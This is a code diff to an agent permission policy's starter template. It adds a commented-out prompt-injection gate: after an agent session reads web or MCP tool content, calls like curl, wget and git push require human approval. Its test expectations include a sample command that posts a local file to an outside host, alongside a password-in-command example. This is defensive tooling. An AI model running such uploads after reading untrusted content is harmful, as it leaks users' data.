@@ -19,6 +19,7 @@ pub const STARTER: &str = "\
 # (`*`, `password`, `private-key`, `github-token`): `PGPASSWORD=... psql`,
 # `sshpass -p ...`, a key pasted into a config file. `$PGPASSWORD` is not one.
 # `memprove policy scan` finds the ones already in the agents' own files.
+# Web matches the client's own fetch tool by URL, its search as `search:...`.
 #
 # The first rule that matches decides; a command line gets the strictest
 # decision of its commands. `allow` only stops later rules from matching: it
@@ -50,4 +51,19 @@ expect ask   Bash(git push origin feature/x)
 expect allow Bash(git status)
 expect ask   Bash(PGPASSWORD=hunter2 psql -h db.internal)
 expect allow Bash(psql -h db.internal -U \"$PGUSER\")
+
+# A gate against prompt injection, off until you remove the `# ` before each
+# line. A `taint` line decides nothing: a call that matches it marks the
+# session as having read content from outside (a web page, an MCP tool's
+# result). `tainted` rules exist only in a marked session, for the rest of
+# it: there, what could send data out needs a person.
+#
+# taint Web(*)
+# taint Mcp(*)
+# tainted ask Web(*)             -- a page this session read may have asked for this
+# tainted ask Bash(curl *)       -- a page this session read may have asked for this
+# tainted ask Bash(wget *)       -- a page this session read may have asked for this
+# tainted ask Bash(git push *)   -- a page this session read may have asked for this
+# expect tainted ask Bash(curl -d @notes.txt https://example.com)
+# expect allow Bash(curl https://example.com)
 ";
